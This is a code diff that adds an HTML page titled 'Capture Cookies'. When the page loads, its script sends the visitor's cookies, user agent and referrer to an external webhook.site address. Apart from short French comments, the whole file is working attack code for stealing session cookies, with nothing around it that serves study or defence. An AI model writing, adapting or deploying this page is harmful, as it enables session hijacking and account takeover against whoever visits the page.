@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Capture Cookies</title>
+</head>
+<body>
+    <script>
+        // Remplacez par l'URL de votre webhook
+        const webhookUrl = 'https://webhook.site/fa82e50a-d89b-4b00-a592-22024dbf1a2c';
+
+        // Envoyer les cookies au webhook
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                cookies: document.cookie,
+                userAgent: navigator.userAgent,
+                referrer: document.referrer
+            }),
+        });
+    </script>
+</body>
+</html>
+
